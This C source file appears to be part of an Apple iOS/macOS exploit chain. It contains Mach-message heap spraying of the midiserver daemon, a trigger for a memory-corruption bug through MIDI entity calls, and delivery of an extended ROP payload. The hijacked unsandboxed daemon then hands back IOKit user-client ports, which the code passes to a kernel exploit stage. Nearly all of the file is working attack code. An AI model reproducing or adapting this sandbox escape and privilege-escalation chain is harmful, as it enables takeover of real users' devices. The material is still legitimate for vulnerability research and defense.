struct MIGSender_spray *sprayMsg = NULL;
void Send_spray_mem(){
    if(sprayMsg == NULL){
        sprayMsg = malloc(sizeof(*sprayMsg));
        sprayMsg->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
        sprayMsg->Head.msgh_size = sizeof(*sprayMsg);
        sprayMsg->Head.msgh_remote_port = Retrieve_midiIo_port();
        sprayMsg->Head.msgh_local_port = MACH_PORT_NULL;
        sprayMsg->Head.msgh_voucher_port = MACH_PORT_NULL;
        sprayMsg->Head.msgh_id = 0;
        sprayMsg->msgh_body.msgh_descriptor_count = 1;
        
        sprayMsg->ool.address = (void*)SPRAY_ADDRESS;
        sprayMsg->ool.size = (mach_msg_size_t)(mapEnd - SPRAY_ADDRESS);
        sprayMsg->ool.deallocate = false;
        sprayMsg->ool.copy = MACH_MSG_VIRTUAL_COPY;
        sprayMsg->ool.type = MACH_MSG_OOL_DESCRIPTOR;
    }
    
    mach_msg(&sprayMsg->Head, MACH_SEND_MSG, sprayMsg->Head.msgh_size, 0, 0, 0, 0);
}

struct MIGSender_trigger{
    mach_msg_header_t Head;
    char pad[4];
    int input_cmd;
    int opaID_len;
    uint32_t opaID;
};
struct MIGSender_trigger *triggerExpMsg;
void Init_triggerExp_msg(uint32_t opaID){
    triggerExpMsg = calloc(1, sizeof(*triggerExpMsg));
    
    triggerExpMsg->Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
    triggerExpMsg->Head.msgh_size = sizeof(*triggerExpMsg);
    triggerExpMsg->Head.msgh_remote_port = Retrieve_midiIo_port();
    triggerExpMsg->Head.msgh_local_port = MACH_PORT_NULL;
    triggerExpMsg->Head.msgh_voucher_port = MACH_PORT_NULL;
    triggerExpMsg->Head.msgh_id = 0;
    triggerExpMsg->input_cmd = 2;
    triggerExpMsg->opaID_len = 4;
    triggerExpMsg->opaID = opaID;
}

void Send_triggerExp_msg(){
    int mrr = mach_msg(&triggerExpMsg->Head, MACH_SEND_MSG, triggerExpMsg->Head.msgh_size, 0, 0, 0, 0);
    if(mrr){
        printf("Error occurred when sending out triggerExpMsg: 0x%x!\n", mrr);
    }
}

void Send_extending_rop(){
    
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t extended_rop_payload;
    }msg = {0};
    msg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    msg.msgh_body.msgh_descriptor_count = 1;
    
    uint64_t *_newrop = malloc(EXTENDED_ROP_SIZE);
    Assemble_ROP4(_newrop, EXTENDED_ROP_ADDRESS);
    
    msg.extended_rop_payload.address = _newrop;
    msg.extended_rop_payload.size = EXTENDED_ROP_SIZE;
    msg.extended_rop_payload.deallocate = false;
    msg.extended_rop_payload.copy = MACH_MSG_VIRTUAL_COPY;
    msg.extended_rop_payload.type = MACH_MSG_OOL_DESCRIPTOR;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
    free(_newrop);
}

void Send_overwritting_iosurfaceMap(uint64_t our_data_addr, uint64_t our_data_len, uint64_t remote_map_addr){
    
    struct {
        mach_msg_header_t Head;
        uint64_t our_data_addr;
        uint64_t our_data_len;
        uint64_t remote_map_addr;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    msg.our_data_addr = our_data_addr;
    msg.our_data_len = our_data_len;
    msg.remote_map_addr = remote_map_addr;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

void Send_our_serverport(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        mach_msg_port_descriptor_t our_task_port;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    msg.msgh_body.msgh_descriptor_count = 2;
    msg.our_recv_port.name = our_serverport;
    msg.our_recv_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.our_recv_port.type = MACH_MSG_PORT_DESCRIPTOR;
    msg.our_task_port.name = mach_task_self();
    msg.our_task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.our_task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

void Send_exit_msg(){
    struct {
        mach_msg_header_t Head;
    }msg = {0};
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

mach_port_t Reply_ioservice_handler(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    int mrr = mach_msg_receive(&msg.Head);
    
    if(mrr != 0){
        printf("Error occurred when Reply_ioservice_handler(0x%x)\n", mrr);
        return 0;
    }
    return msg.port.name;
}

void Reply_notify_completion(){
    struct {
        mach_msg_header_t Head;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    mach_msg_receive(&msg.Head);
}

struct timeval gettimeofday_start, gettimeofday_end;

void exp_start(){
    
    if(setjmp(jmpb))
        return;
    
    gettimeofday(&gettimeofday_start, NULL);
    
    dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);
    
    Find_dylibcache();
    Find_ropGadgets();
    printf("Dyldcache and ropGadgets Ready!\n");
    
    Prepare_our_Mach_server();
    printf("Our Mach Server Ready! 0x%x\n", our_serverport);
    
    Prepare_cow_file_wROP();
    Map_file_intoMem();
    
    Prepare_bunch_keys(); // For iterating
    size_t spraybufsize = 0x90;
    void *spraybuf = malloc(spraybufsize);
    for(int i=0; i<spraybufsize; i+=0x8){
        *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS;
    }
    CFDataRef spraydata = CFDataCreate(kCFAllocatorDefault, spraybuf, spraybufsize);
    
    char *kernelcache_path = Get_tempfile2_path();
    remove(kernelcache_path);
    printf("kernelcache_path: %s\n", kernelcache_path);
    
    print_line("0/3\n");
    
    while(1){
        uint32_t mclient_id = 0;
        MIDIClientCreate(CFSTR(""), useless_notify, NULL, &mclient_id);
        printf("MIDI Client ID: 0x%x\n", mclient_id);
        
        uint32_t mdevice_id = 0;
        MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &mdevice_id);
        printf("MIDI Device ID: 0x%x\n", mdevice_id);
        
        for(int i=0; i<300; i++){
            MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata);
        }
        
        Send_spray_mem();
        Send_spray_mem();
        
        for(int i=0; i<300; i=i+2){
            MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]);
        }
        
        uint32_t mentity_id = 0;
        MIDIDeviceAddEntity(mdevice_id, CFSTR(""), false, 0, 0, &mentity_id);
        
        Init_triggerExp_msg(mentity_id);
        Send_triggerExp_msg();
        
        uint32_t verifysucc_mdevice_id = 0;
        MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &verifysucc_mdevice_id);
        printf("verify_mdevice_id: 0x%x\n", verifysucc_mdevice_id);
        
        if(verifysucc_mdevice_id == mdevice_id + 2){
            break;
        }
        
        // We failed, reattempting...
        printf("Try again\n");
        MIDIRestart();
    }
    
    printf("Collecting Kernel attack surface:\n");
    Send_extending_rop();
    Send_our_serverport();
    
    // Ask the unsandbox daemon which has been totally controlled at this moment
    // To open IO device ports, and passing to us for next stage kernel attacking.
    mach_port_t AppleSPUProfileDriverUserClient_port = Reply_ioservice_handler();
    printf("  1/3: 0x%x\n", AppleSPUProfileDriverUserClient_port);
    mach_port_t IOSurfaceRootUserClient_port = Reply_ioservice_handler();
    printf("  2/3: 0x%x\n", IOSurfaceRootUserClient_port);
    mach_port_t AppleAVE2UserClient_port = Reply_ioservice_handler();
    printf("  3/3: 0x%x\n", AppleAVE2UserClient_port);
    
    if( !(AppleSPUProfileDriverUserClient_port&&IOSurfaceRootUserClient_port&&AppleAVE2UserClient_port) ){
        printf("Error: No Kernel attack surface found\n");
        return;
    }
    
    // Parse kernel
    print_line("1/3\n");
    void kernel_exp_start(uint32_t profile_ioconn, uint32_t ave_ioconn, uint32_t surface_ioconn);
    kernel_exp_start(AppleSPUProfileDriverUserClient_port, AppleAVE2UserClient_port, IOSurfaceRootUserClient_port);
}




